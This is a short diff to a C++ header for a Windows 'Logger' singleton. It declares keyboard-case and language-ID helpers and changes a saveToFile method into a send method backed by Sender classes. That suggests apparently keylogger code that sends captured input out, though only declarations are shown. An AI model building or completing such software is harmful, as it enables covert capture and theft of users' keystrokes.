@@ -5,6 +5,7 @@
 #include "Sender.h"
 #include "FabricSender.h"
 #include <Windows.h>
+#include "Runner.h"
 
 #define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
 #define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
@@ -28,10 +29,12 @@ private:
 	bool checkUpper();
 	char toUpper(char letter);
 	char toLower(char letter);
-	void saveToFile();
+	static void send();
 	static Sender** array_senders;
+	static const int lengthArray;
 public:
 	static Logger* getInstance();
 	static void run();
+	static bool exit;
 };
 
